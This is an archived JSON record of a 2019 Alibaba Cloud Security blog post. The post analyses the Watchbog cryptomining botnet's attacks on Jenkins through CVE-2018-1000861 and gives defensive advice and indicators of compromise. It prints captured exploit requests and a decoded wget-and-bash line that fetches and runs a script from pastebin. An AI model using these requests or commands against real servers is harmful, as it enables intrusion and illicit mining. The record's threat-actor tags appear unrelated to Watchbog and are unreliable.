{
    "id": "c8d9f17a-f245-4821-8735-013abd723524",
    "created_at": "2023-01-12T15:05:39.262815Z",
    "updated_at": "2025-03-27T02:14:34.118287Z",
    "deleted_at": null,
    "sha1_hash": "0eb7362fd6655de9734d498bcf8b5a171cba5cf9",
    "title": "2019-05-14 - Return of Watchbog- Exploiting Jenkins CVE-2018-1000861",
    "authors": "",
    "file_creation_date": "2022-05-28T19:18:01Z",
    "file_modification_date": "2022-05-28T19:18:01Z",
    "file_size": 2076593,
    "plain_text": "# Return of Watchbog: Exploiting Jenkins CVE-2018- 1000861\n\n**[alibabacloud.com/blog/return-of-watchbog-exploiting-jenkins-cve-2018-1000861_594798](https://www.alibabacloud.com/blog/return-of-watchbog-exploiting-jenkins-cve-2018-1000861_594798)**\n\n[Alibaba Cloud Security May 14, 2019](https://community.alibabacloud.com/users/5705432749246152) 36,139 0\n\nWatchbog, a cryptocurrency-mining botnet, has made a comeback by exploiting Jenkins\nCVE-2018-1000861 this time.\n\nOn May 12th 2019, we observed Watchbog, a cryptocurrency-mining botnet, started a grand\nattack aiming at Jenkins. Infected servers do not automatically attack its peers, meaning that\nthe trojan itself is not contagious. However, it still cause loss to victim users by mining\ncryptocurrency and adding malicious commands to scheduled task for persistence.\n\nWatchbog botnet is not new; it has previous conviction. Earlier this year, we detected\nwatchbog attacking services such as Nexus Repository Manager 3, ThinkPHP and Linux\nSupervisord and deploying miners with highly similar technique. The process is very\nstraightforward, as shown below:\n\n\n-----\n\nThis article gives insight into the attack event and provides suggestion for cleaning malware\nand preventing future intrusion.\n\n## Start of Attack\n\nWe found this request on a victim Jenkins server, exploiting CVE-2018-1000861 :\n```\nGET\n/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbo\nsandbox=True&value=public class x{public x(){new\nString(\"776765742068747470733a2f2f706173746562696e2e636f6d2f7261772f42335235556e776820\n HTTP/1.1\nHost: [victim_host]:[jenkins_port]\n\n```\nThis payload is different from another exploit targeting CVE-2019-1003000 we have seen in\nanother botnet event by ImposterMiner in February:\n```\nGET\n/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowD\nvalue=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name=%27orange.tw%27,%20root=\n HTTP/1.1\nHost: [victim_host]:[jenkins_port]\n\n```\nThe two payloads look alike because they both use the\n\"/securityRealm/user/admin/descriptorByName\" gadget. Yet they are essentially different in\nthat CVE-2018-1000861 is a vulnerability in Jenkins' Stapler web framework, while CVE2019-1003000 is in Script Security Plugin.\n\nThe hex-encoded part in the former CVE-2018-1000861 payload downloads and runs\nmalicious shell command:\n```\nwget https://pastebin.com/raw/B3R5Unwh -O /tmp/baby\nbash /tmp/baby\n\n```\n[The contained url points to another pastebin url (https://pastebin.com/raw/J6NdVBHq), which](https://pastebin.com/raw/J6NdVBHq),)\npoints to yet another.\n\n\n-----\n\nThe main part of malicious shell script is encoded and placed in\n[https://pastebin.com/raw/KGwfArMR.](https://pastebin.com/raw/KGwfArMR.)\n\n## Mining and Persistence\n\nDuring execution of the aforesaid shell script, a cryptocurrency miner is installed on victim\nserver by downloading from following URL (decoded from $mi_64)\n```\nhttps://github.com/xmrig/xmrig/releases/download/v2.14.1/xmrig-2.14.1-xenialx64.tar.gz\n\n```\nConfiguration file for mining is as follows:\n\n\n-----\n\nThe malicious shell script maintain persistence by adding itself to crontab.\n\nOther tampered crontab files:\n\nAn ironic thing is that the threat actor says victims can contact him at jeff4rpartner@tutanota.com and promises to offer \"cleanup script, source of entry and patch\".\n\n\n-----\n\nAccording to minexmr.com, the threat actor may have earned about 20 Moneros (1500USD)\nas economic profit from mining.\n\nAnother thing worth mentioning is that we have reported malicious URLs to pastebin.com\nand request to ban those addresses when watchbog first started its attack in March.\nHowever pastebin.com has not replied or taken any effective action.\n\n## Security Suggestion\n\nServices for internal use should not be exposed to the Internet. Use adequate ACL or\nother authentication techniques to only allow access from trusted users.\nIt is necessary for users to upgrade their software in time, especially when the vendor\nof software has published security-related advisory.\nSince pastebin.com has been used by many botnets, users who do not often visit this\nwebsite may use some tricks to drop packets to and from it, such as on Linux you can\nrun: `echo -e \"\\n0.0.0.0 pastebin.com\" >> /etc/hosts This command`\nsinkholes(redirects) any traffic to and from pastebin.com.\nCloud firewalls are useful in preventing attacks. We recommend Alibaba Cloud Firewall\nbecause it is able to detect, block and analyze threats. You will be protected from\nintrusion and malicious mining with AI technologies on your side.\n\n\n-----\n\nAlibaba Cloud Managed Security Service enables users to call on expertise of\nAlibaba's security specialists, who will help you clean up malware, improve\nconfigurations, and enhance overall security. If you are concerned about your\norganization's security, you should give it a try.\n\n## IOC\n\nwallet:\n```\n44gaihcvA4DHwaWoKgVWyuKXNpuY2fAkKbByPCASosAw6XcrVtQ4VwdHMzoptXVHJwEErbds66L9iWN6dRPNZJ\n (previous)\n47k2wdnyyBoMT6N9ho5Y7uQg1J6gPsTboKP6JXfB5msf3jUUvTfEceK5U7KLnWir5VZPKgUVxpkXnJLmijau3V\n (current)\n\n```\npool address:\n```\npool.minexmr.com:80\npool.minexmr.com:443\n\n```\nurl:\n```\nhttps://pastebin.com/raw/B3R5Unwh\nhttps://pastebin.com/raw/J6NdVBHq\nhttps://pastebin.com/raw/KGwfArMR\nhttps://pastebin.com/raw/AgdgACUD\nhttps://pastebin.com/raw/vvuYb1GC\nhttps://pastebin.com/raw/aGTSGJJp\nhttps://pastebin.com/raw/05p0fTYd\nhttps://pastebin.com/raw/KxWPFeEn\nhttps://pastebin.com/raw/X6wvuv98\nhttps://pixeldra.in/api/download/nZ2s4L\n\n```\nmd5:\n```\n65cfcad6dc3d31695b8f3ffa08e5d389\n95721de55ad89005484b4c21f768d94e\n157495f6ba8c36c38984d1f902cf3ac0\n314097a1d41697352c961026aa1ed87c\n1dbd97c70a89e64cbfb65c78ac39938e\n\n```\nlocal path:\n```\n/tmp/systemd-private-afjdhdicjijo473skiosoohxiskl573q-systemd-timesyncc.serviceg1g5qf/cred/fghhhh/data\n\n## Reference:\n\n```\n[https://nvd.nist.gov/vuln/detail/CVE-2018-1000861](https://nvd.nist.gov/vuln/detail/CVE-2018-1000861)\n\nhttps://www.alibabacloud.com/blog/imposterminer-trojan-takes-advantage-of-newlypublished-jenkins-rce-vulnerability 594729\n\n\n-----\n\n[http://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html](http://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html)\n\n[Security](https://community.alibabacloud.com/tags/type_blog-tagid_2299/) [Cryptocurrency](https://community.alibabacloud.com/tags/type_blog-tagid_17783/) [Trojan](https://community.alibabacloud.com/tags/type_blog-tagid_20322/) [Botnet](https://community.alibabacloud.com/tags/type_blog-tagid_28288/) [Cryptocurrency Mining](https://community.alibabacloud.com/tags/type_blog-tagid_28785/) [Jenkins](https://community.alibabacloud.com/tags/type_blog-tagid_28862/) [Watchbog](https://community.alibabacloud.com/tags/type_blog-tagid_29074/)\n0 0 **0**\n**Share on**\n\n## Read previous post:\n\n[ImposterMiner Trojan Takes Advantage of Newly Published Jenkins RCE Vulnerability](https://www.alibabacloud.com/blog/imposterminer-trojan-takes-advantage-of-newly-published-jenkins-rce-vulnerability_594729)\n\n## Read next post:\n\n[Deep Dive into Cloud Firewall: Addressing Aggressive Mining Worms](https://www.alibabacloud.com/blog/deep-dive-into-cloud-firewall-addressing-aggressive-mining-worms_594807)\n\n## Alibaba Cloud Security\n\n33 posts | 15 followers\n\nFollow\n\n### You may also like\n\n Comments\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-05-14 - Return of Watchbog- Exploiting Jenkins CVE-2018-1000861.pdf"
    ],
    "report_names": [
        "2019-05-14 - Return of Watchbog- Exploiting Jenkins CVE-2018-1000861.pdf"
    ],
    "threat_actors": [
        {
            "id": "e90ec9cb-9959-455d-b558-4bafef64d645",
            "created_at": "2022-10-25T16:07:24.222081Z",
            "updated_at": "2025-03-27T02:02:10.14365Z",
            "deleted_at": null,
            "main_name": "Sphinx",
            "aliases": [
                "APT-C-15"
            ],
            "source_name": "ETDA:Sphinx",
            "tools": [
                "AnubisSpy",
                "Backdoor.Oldrea",
                "Bladabindi",
                "Fertger",
                "Havex",
                "Havex RAT",
                "Jorik",
                "Oldrea",
                "PEACEPIPE",
                "njRAT",
                "yellowalbatross"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "3fff98c9-ad02-401d-9d4b-f78b5b634f31",
            "created_at": "2023-01-06T13:46:38.376868Z",
            "updated_at": "2025-03-27T02:00:02.818071Z",
            "deleted_at": null,
            "main_name": "Cleaver",
            "aliases": [
                "Cobalt Gypsy",
                "G0003",
                "Operation Cleaver",
                "Op Cleaver",
                "Tarh Andishan",
                "Alibaba",
                "TG-2889"
            ],
            "source_name": "MISPGALAXY:Cleaver",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535939,
    "ts_updated_at": 1743041674,
    "ts_creation_date": 1653765481,
    "ts_modification_date": 1653765481,
    "files": {
        "pdf": "https://archive.orkl.eu/0eb7362fd6655de9734d498bcf8b5a171cba5cf9.pdf",
        "text": "https://archive.orkl.eu/0eb7362fd6655de9734d498bcf8b5a171cba5cf9.txt",
        "img": "https://archive.orkl.eu/0eb7362fd6655de9734d498bcf8b5a171cba5cf9.jpg"
    }
}